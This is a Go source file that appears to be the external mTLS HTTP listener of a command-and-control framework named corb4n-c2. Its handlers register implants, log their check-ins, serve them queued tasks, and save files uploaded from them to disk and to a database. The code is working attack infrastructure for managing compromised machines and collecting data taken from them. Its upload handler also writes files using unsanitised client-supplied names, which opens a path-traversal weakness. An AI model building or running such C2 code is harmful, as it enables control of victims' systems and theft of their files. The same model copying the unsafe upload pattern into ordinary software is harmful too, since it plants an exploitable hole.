package c2ext

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"

	"github.com/dovelus/corb4n-c2/server/comunication"
	"github.com/dovelus/corb4n-c2/server/db"
	"github.com/gorilla/mux"
)

// TODO: Hande task results where no file is required to be uploaded

type Request struct {
	ReqType string          `json:"req_type"`
	Content json.RawMessage `json:"content"`
}

// logRequest is a middleware that logs the details of each request
func logRequest(handler http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		comunication.Logger.Infof("Received request: %s %s from %s", req.Method, req.URL.Path, req.RemoteAddr)
		handler.ServeHTTP(w, req)
	})
}
func requestHandler(w http.ResponseWriter, r *http.Request) {
	// Parse multipart form data
	err := r.ParseMultipartForm(10 << 20) // 10 MB
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to parse multipart form: %v", err)
		return
	}

	// Extract req_type and JSON content
	reqType := r.FormValue("req_type")
	content := r.FormValue("content")
	var req Request
	req.ReqType = reqType
	err = json.Unmarshal([]byte(content), &req.Content)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode request: %v", err)
		return
	}

	// Process the request based on ReqType
	switch req.ReqType {
	case "InsertImplantInfo":
		handleInsertImplantInfo(w, req.Content)
	case "UpdateImplantLastCheckin":
		handleUpdateImplantLastCheckin(w, req.Content)
	case "GetTasksByImplantID":
		handleGetTasksByImplantID(w, req.Content)
	case "UploadTaskResults":
		handleUploadTaskResults(w, r)
	default:
		http.Error(w, "unknown request type", http.StatusBadRequest)
		comunication.Logger.Errorf("unknown request type: %s", req.ReqType)
	}
}

// Handle ImplantInfo request
func handleInsertImplantInfo(w http.ResponseWriter, content json.RawMessage) {
	var implant *db.ImplantInfo
	err := json.Unmarshal(content, &implant)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode implant info: %v", err)
		return
	}

	err = db.AddImplant(implant)
	if errors.Is(err, comunication.ErrImplantExists) {
		http.Error(w, err.Error(), http.StatusConflict)
		comunication.Logger.Errorf("implant already exists: %v", err)
		return
	}
}

// Handle UpdateImplantLastCheckin request
func handleUpdateImplantLastCheckin(w http.ResponseWriter, content json.RawMessage) {
	var data struct {
		ID string `json:"id"`
	}
	err := json.Unmarshal(content, &data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode update implant last checkin request: %v", err)
		return
	}

	err = db.UpdateImplantCheckin(data.ID)
	if errors.Is(err, comunication.ErrNoResults) {
		http.Error(w, err.Error(), http.StatusNotFound)
		comunication.Logger.Errorf("no results found: %v", err)
		return
	}
}

// Handle GetTasksByImplantID request
func handleGetTasksByImplantID(w http.ResponseWriter, content json.RawMessage) {
	var data struct {
		ID        string `json:"id"`
		Completed bool   `json:"completed"`
	}
	err := json.Unmarshal(content, &data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode get tasks by implant ID request: %v", err)
		return
	}

	tasks, err := db.GetImplantTasks(data.ID, data.Completed)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Warnf("failed to get tasks by implant ID: %v", data.ID)
		return
	}

	tasksJSON, err := json.Marshal(tasks)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to encode tasks: %v", err)
		return
	}

	// Log the readable JSON string
	comunication.Logger.Infof("tasks JSON: %s", string(tasksJSON))

	w.Header().Set("Content-Type", "application/json")
	_, err = w.Write(tasksJSON)
	if err != nil {
		return
	}
}

// Handle UploadTaskResults request
func handleUploadTaskResults(w http.ResponseWriter, r *http.Request) {
	// Parse multipart form data
	err := r.ParseMultipartForm(10 << 20) // 10 MB
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to parse multipart form: %v", err)
		return
	}

	// Extract JSON content
	content := r.FormValue("content")
	var data struct {
		ID       string `json:"id"`
		TaskID   string `json:"task_id"`
		FileName string `json:"file_name"`
		FileType string `json:"file_type"`
	}
	err = json.Unmarshal([]byte(content), &data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode upload task results request: %v", err)
		return
	}

	// Extract file
	file, handler, err := r.FormFile("file")
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to get file from form: %v", err)
		return
	}
	defer func(file multipart.File) {
		err := file.Close()
		if err != nil {
			comunication.Logger.Errorf("failed to close file: %v", err)
		}
	}(file)

	// Create directory for the implant if it doesn't exist
	implantDir := filepath.Join("uploads", data.ID)
	err = os.MkdirAll(implantDir, os.ModePerm)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to create directory for implant: %v", err)
		return
	}

	// Save the uploaded file to the filesystem and save in the database the absolute path
	filePath := filepath.Join(implantDir, handler.Filename)
	dst, err := os.Create(filePath)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to create file: %v", err)
		return
	}
	defer func(dst *os.File) {
		err := dst.Close()
		if err != nil {
			comunication.Logger.Errorf("failed to close file: %v", err)
		}
	}(dst)

	_, err = io.Copy(dst, file)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to save file: %v", err)
		return
	}

	// Get file size
	fileInfo, err := dst.Stat()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to get file info: %v", err)
		return
	}

	absFilePath, err := filepath.Abs(filePath)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to get absolute file path: %v", err)
		return
	}
	// Store the file reference in the database
	fileInfoDB := &db.FileInfo{
		ImplantID: data.ID,
		FileName:  handler.Filename,
		FileSize:  fileInfo.Size(),
		FileType:  data.FileType,
		FilePath:  absFilePath,
		CreatedAt: comunication.CurrentUnixTimestamp(),
	}

	err = db.AddFile(fileInfoDB)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to store file reference in database: %v", err)
		return
	}

	w.WriteHeader(http.StatusOK)
}

// StartExtHTTPServer starts the external mTLS-HTTP server
func StartExtHTTPServer() {
	serverCertPath, err := filepath.Abs(filepath.Join("certs", "server.crt"))
	if err != nil {
		comunication.Logger.Fatalf("failed to get absolute path for server certificate: %v", err)
	}
	serverKeyPath, err := filepath.Abs(filepath.Join("certs", "server.key"))
	if err != nil {
		comunication.Logger.Fatalf("failed to get absolute path for server key: %v", err)
	}

	serverCert, err := LoadServerCertificate(serverCertPath, serverKeyPath)
	if err != nil {
		comunication.Logger.Fatalf("failed to load server certificate: %v", err)
	}

	clientCAPool, err := LoadClientCACertificate(filepath.Join("certs", "client.crt"))
	if err != nil {
		comunication.Logger.Fatalf("failed to load client CA certificate: %v", err)
	}

	tlsConfig := CreateTLSConfig(serverCert, clientCAPool)

	r := mux.NewRouter()
	r.Use(logRequest)
	r.HandleFunc("/request", requestHandler).Methods("POST")

	srv := &http.Server{
		Addr:         "localhost:8443",
		Handler:      r,
		TLSConfig:    tlsConfig,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)),
	}

	comunication.Logger.Infof("Starting external mTLS-HTTP server on %s", srv.Addr)
	comunication.Logger.Fatal(srv.ListenAndServeTLS("", ""))
}
